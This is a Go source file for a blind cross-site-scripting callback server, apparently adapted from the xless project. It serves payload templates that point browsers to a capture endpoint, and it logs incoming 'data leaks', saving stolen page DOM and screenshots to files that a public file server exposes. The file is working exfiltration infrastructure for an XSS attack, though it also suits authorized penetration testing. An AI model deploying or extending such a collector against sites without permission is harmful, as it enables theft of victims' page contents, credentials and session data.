package main

// TODO:
// - Refactor code
// - Add https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin header where necessary
// - Add js file routes
// - Improve output format
// - Rename iframe and iframe-ext

// https://raw.githubusercontent.com/mazen160/xless/master/payload.js
// https://github.com/mazen160/xless

import (
    "fmt"
    "net/http"
    "log"
    "time"
    "strings"
    "net/http/httputil"
    "html/template"
    "encoding/json"
    "io/ioutil"
    "crypto/sha1"
    "encoding/hex"
    "encoding/base64"
    "os"
)

const (
    VERTICAL_SEPARATOR = " :: "
    OUTPUT_FOLDER = "output"
)


type logWriter struct {}

func (writer logWriter) Write(bytes []byte) (int, error) {
    out := time.Now().UTC().Format("2006-01-02 15:04:05")
    lout := len(out)
    out += VERTICAL_SEPARATOR
    lines := strings.Split(strings.TrimRight(string(bytes), "\n"),"\n")
    for i := 0; i < len(lines); i++ {
        if i != 0 {
            out += strings.Repeat(" ", lout) + VERTICAL_SEPARATOR
        }
        out += strings.TrimLeft(lines[i], "\t") + "\n"
    }
    return fmt.Print(out)
}

func PrintRequest(r *http.Request, reason string) {
    log.Println("::::::::::::::::::::::::::::::::::::")
    log.Println(strings.ToUpper(reason), "|", r.RemoteAddr)
    log.Println("::::::::::::::::::::::::::::::::::::")
    requestDump, err := httputil.DumpRequest(r, true)
    if err != nil {
        log.Println(err)
    }
    lines := strings.Join(strings.Split(string(requestDump),"\n"),"\n\t")
    log.Println(lines)
}

func getSha1HashFromString(s string) string {
    h := sha1.New()
    h.Write([]byte(s))
    sha1_hash := hex.EncodeToString(h.Sum(nil))
    return sha1_hash
}

type Data struct {
    Url string
}

func main() {

    port := 8899
    scheme := "http"

    tmpl := template.Must(template.ParseFiles("payload.html"))
    tmplExt := template.Must(template.ParseFiles("ext-payload.html"))

    // setting up logger
    log.SetFlags(0)
    log.SetOutput(new(logWriter))

    http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
        PrintRequest(r, "Payload request")
        data := Data{
            Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
        }
        tmpl.Execute(w, data)
    })

    http.HandleFunc("/extpayload", func(w http.ResponseWriter, r *http.Request) {
        PrintRequest(r, "Payload request")
        data := Data{
            Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
        }
        tmplExt.Execute(w, data)
    })

    // capture the data
    http.HandleFunc("/c", func(w http.ResponseWriter, r *http.Request) {
        log.Println("::::::::::::::::::::::::::::::::::::")
        log.Println("Data leak received |", r.RemoteAddr)
        log.Println("::::::::::::::::::::::::::::::::::::")
        var extracted map[string] string
        //PrintRequest(r, "asdf")
        if err := json.NewDecoder(r.Body).Decode(&extracted); err == nil {
            for k, v := range extracted {
                if k == "DOM" {
                    sha1hash := getSha1HashFromString(v)
                    filename := OUTPUT_FOLDER + "/" + sha1hash + ".txt"
                    url := fmt.Sprintf("%s://%s/%s", scheme, r.Host, filename)
                    // write dom to file
                    ioutil.WriteFile(filename,[]byte(v), os.FileMode(0666))
                    log.Printf("%15s | %s\n", k, url)
                    continue
                }

                if k == "IMG" {
                    sha1hash := getSha1HashFromString(v)
                    filename := OUTPUT_FOLDER + "/" + sha1hash + ".png"
                    url := fmt.Sprintf("%s://%s/%s", scheme, r.Host, filename)
                    // write dom to file
                    tmp := strings.Split(v, ",")
                    gs := tmp[strings.Count(v, ",")]
                    decodedString, err := base64.StdEncoding.DecodeString(gs)
                    if err != nil {
                        fmt.Println("Error Found:", err)
                        continue
                    }
                    ioutil.WriteFile(filename,decodedString, os.FileMode(0666))
                    log.Printf("%15s | %s\n", k, url)
                    continue
                }
                log.Printf("%15s | %s\n", k, v)
            }
        } else {
            log.Println("[!] Something went wrong with this request [!]")
            PrintRequest(r, "Some go run bruva during capture request!")
        }
    })

    fs := http.FileServer(http.Dir(OUTPUT_FOLDER+"/"))
    http.Handle("/"+OUTPUT_FOLDER+"/", http.StripPrefix("/"+OUTPUT_FOLDER+"/", fs))

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        PrintRequest(r, "Casual request")
        fmt.Fprintln(w, "Hi Toby, I didn't expect you here so quickly.")
    })


    log.Printf("Starting server on port %d\n", port)
    if err := http.ListenAndServe(fmt.Sprintf(":%d",port), nil); err != nil {
        log.Fatalln("Server couldn't start:", err.Error())
    }

}
